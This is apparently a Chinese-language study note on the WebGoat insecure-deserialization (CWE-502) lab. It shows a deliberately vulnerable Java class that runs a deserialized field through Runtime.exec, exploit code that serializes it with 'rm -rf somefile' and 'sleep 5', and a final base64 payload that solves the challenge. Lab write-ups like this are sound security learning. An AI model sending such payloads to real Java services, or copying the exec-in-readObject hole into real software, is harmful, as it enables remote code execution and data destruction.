---
id: CWE-502
title: Insecure Deserialization
---
<!-- muse start -->
Web Goat 的 Java 反序列化示例，挑战的序列化对象名称中包含层级路径，需实际构建路径并在主文件引用。实际上这里是对 Java 语言对象的“全限定名”的学习，即唯一绝对标识。并且与曾经的lab不同，此处使用了与攻击链看似无关的对象的版本id与时间信息属性。
<!-- muse end -->

## 2. 什么是序列化

序列化是将对象转换为可后续恢复的数据格式的过程。人们通常通过序列化对象来将其保存到存储设备中，或作为通信的一部分进行传输。反序列化是该过程的逆操作，即从某种格式的结构化数据中重建对象。如今，最流行的序列化数据格式是JSON，在此之前是XML。

```json
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

### 原生序列化

许多编程语言提供原生序列化对象的能力。这些原生格式通常比JSON或XML提供更多功能，包括序列化过程的可定制性。但不幸的是，当处理不可信数据时，这些原生反序列化机制的功能可能被恶意利用。针对反序列化器的攻击已被证实可导致拒绝服务、越权访问和远程代码执行攻击。

### 已知受影响的编程语言

* PHP
* Python
* Ruby
* Java
* C
* C++

### 数据而非代码

仅数据会被序列化，代码本身不会被序列化。反序列化会创建新对象并从字节流复制所有数据，最终获得与序列化前完全相同的对象。

## 简单利用

### 脆弱代码

以下是一个著名的Java反序列化漏洞示例。

```java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

它期望得到一个`AcmeObject`对象，但在类型转换发生之前，它会执行`readObject()`方法。如果攻击者找到一个在`readObject()`方法中实现了危险操作的类，他就可以序列化该对象，并强制易受攻击的应用程序执行这些操作。

### 攻击条件

攻击者需要在应用的类路径中找到一个支持序列化，并且其`readObject()`方法存在危险实现的类。

```java
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

        private static final long serialVersionUID = 1;

        private String taskName;
        private String taskAction;
        private LocalDateTime requestedExecutionTime;

        public VulnerableTaskHolder(String taskName, String taskAction) {
                super();
                this.taskName = taskName;
                this.taskAction = taskAction;
                this.requestedExecutionTime = LocalDateTime.now();
        }

        private void readObject( ObjectInputStream stream ) throws Exception {
        //deserialize data so taskName and taskAction are available
                stream.defaultReadObject();

                //blindly run some code. #code injection
                Runtime.getRuntime().exec(taskAction);
     }
}
```

### 漏洞利用

如果上述所示的Java类存在，攻击者就可以序列化该对象并获得远程代码执行的能力。

```java
VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();
byte[] exploit = bos.toByteArray();
```

## 4. 什么是利用链

在反序列化过程中找到一个能直接执行危险操作的利用组件比较罕见（但确实可能发生）。更常见的情况是，找到一个在反序列化时能对其他组件执行操作的利用组件，而该组件又会对第三个组件执行更多操作，如此串联直到触发真正的危险操作。这种能在反序列化过程中实现危险操作的利用组件集合被称为"利用链"。

寻找利用组件构建利用链是安全研究者的热门课题。这类研究通常需要投入大量时间进行代码审计。

## 5. 实践尝试

以下输入框接收序列化对象（字符串格式）并对其进行反序列化操作：

```text
rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l
```

请尝试修改此序列化对象，使页面响应延迟恰好5秒。

示例代码片段中，反序列化后执行
`Runtime.getRuntime().exec(taskAction);`    
尝试控制 `taskAction` 字段，
方法 `VulnerableTaskHolder(String taskName, String taskAction)` 可设置`taskAction`属性

根据示例攻击者java代码构建，省略原型声明与`main`函数：
```java
class VulnerableTaskHolder implements Serializable {

    private static final long serialVersionUID = 2;
    // 省略
}
VulnerableTaskHolder go = new VulnerableTaskHolder("foo", "sleep 5");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();
byte[] exploit = bos.toByteArray();
oos.close();

System.out.println("Base64编码后的载荷:");
System.out.println(java.util.Base64.getEncoder().encodeToString(exploit));
```

序列化后发送，提示为：
`The serialization id does not match. Probably the version has been updated. Let's try again.`

修改字段 `serialVersionUID` 的值再序列化发送，重试几次仍无法成功。

查看 Web Goat 项目的示例答案，解码后发现此处对象名称应当使用
`org.dummy.insecure.framework.VulnerableTaskHolder`
而不是我之前的
`VulnerableTaskHolder`

将 `VulnerableTaskHolder` 类放入路径 `org\dummy\insecure\framework`
并在主函数中引用
```java
import java.io.ByteArrayOutputStream;
```

序列化对象为
`rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfqAQUPJQkHoSAAeHQAB3NsZWVwIDV0AANmb28%3D`

此时可通过挑战